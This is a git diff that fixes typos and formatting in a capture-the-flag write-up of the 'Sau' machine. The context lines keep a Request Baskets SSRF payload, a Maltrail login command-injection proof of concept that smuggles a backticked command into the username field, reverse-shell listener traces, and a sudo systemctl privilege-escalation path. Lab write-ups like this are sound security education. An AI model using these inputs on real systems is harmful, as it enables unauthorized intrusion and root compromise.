@@ -61,7 +61,7 @@ I will start enumeration from port 55555, from our scan we can see there's a web
 i opened it in my web browser and there's a webapp called request baskets, on the bottom left there's a version number
 ![homepage](https://github.com/0xRoqeeb/writeups/assets/49154037/5e98fb0e-a7ff-41d3-9512-da0b43de3894)
 
-i started poking around the site to find out how it works, it's an application that allows you to create a basket with gives you a url and any request made to that url will be collected in your basket hence the name requests basket
+i started poking around the site to find out how it works, it's an application that allows you to create a basket which gives you a url and any request made to that url will be collected in your basket hence the name requests basket
 
 so i tested GET and POST requests on the url using curl i didnt get a response in my terminal but the requests were collected in the request basket
 
@@ -82,8 +82,8 @@ After that i looked up the version number of requests basket online to check if 
 POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
 ```
 
-It turns out that the /api/baskets/name and /baskets/name are the  API endpoints vulnerable to unauthenticated SSRF.
-requests sent to /baskets/name url will be reflected on the url in the ***forward_url** parameter  
+It turns out that the */api/baskets/name* and */baskets/name* are the  API endpoints vulnerable to unauthenticated SSRF.
+Requests sent to */baskets/name* url will be reflected on the url in the ***forward_url** parameter  
 
 you can do this with a curl command
 
@@ -94,7 +94,7 @@ curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward
 but i'll be doing it directly from the web application, to do that we navigate to our baskets page and click on the settings icon top right
 ![2023-07-25_08-51](https://github.com/0xRoqeeb/writeups/assets/49154037/d181f742-6a23-4fa0-84e5-889fb4bf1c7f)
 
-on the configuration page we set the fields as follows
+on the configuration page we set the fields as follows:-    
 ***Forward URL***:*http://127.0.0.1:80/* to reveal any internal websites, this field will forward that website to our basket url  
 
 ***Proxy Response*** : *true* ( i set this field to false as the POC stated but i didn't get a response, it only made sense to set it to true)  
@@ -105,8 +105,8 @@ after that click apply to save changes
 
 now we access our basket through the url again and this time we're seeing something different we come across a CSS starved website ,looking at the bottom left i found out this website was *Powered by Maltrail (v0.53)*
 ![2023-07-25_13-03_1](https://github.com/0xRoqeeb/writeups/assets/49154037/81dda296-d4cb-4674-8582-11e69860ef24) 
-A bit of googling and i found out this version was vulnerable to Unauthenticated OS Command Injection, the username parameter in the */login* page caontained the command injection vulnerability
-POC
+A bit of googling and i found out this version was vulnerable to Unauthenticated OS Command Injection, the username parameter in the */login* page contained the command injection vulnerability
+POC  
 ```console
 curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'
 ```
@@ -163,13 +163,14 @@ zsh: suspended  nc -lvnp 4444
 puma@sau:/opt/maltrail$ export TERM=xterm
 puma@sau:/opt/maltrail$
 ```
+now we have an interactive shell.
 # Privilege Escalation
-now we have an interactive shell .once we get initial access the road to root on sau is a piece of cake
+Once we get initial access the road to root on sau is a piece of cake
 
 running the command sudo -l to see the commands our current user can run
-![2023-07-25_08-19](https://github.com/0xRoqeeb/writeups/assets/49154037/b0687b33-f3e4-474e-af63-901892f95980)
+![2023-07-25_08-19](https://github.com/0xRoqeeb/writeups/assets/49154037/b0687b33-f3e4-474e-af63-901892f95980)  
 we can run */usr/bin/systemctl status trail.service* as root and **NOPASSWD** means we can invoke the sudo command without a password
-I checked gtfobins for the binary we have access too and luckily there's and entry for [systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
+I checked gtfobins for the binary we have access to and luckily there's an entry for [systemctl](https://gtfobins.github.io/gtfobins/systemctl/)  
 
 ![2023-07-25_08-25_1](https://github.com/0xRoqeeb/writeups/assets/49154037/29ad70a9-90ff-4308-86ac-5a93df524b7f)
 Let's run the command ```/usr/bin/systemctl status trail.service```
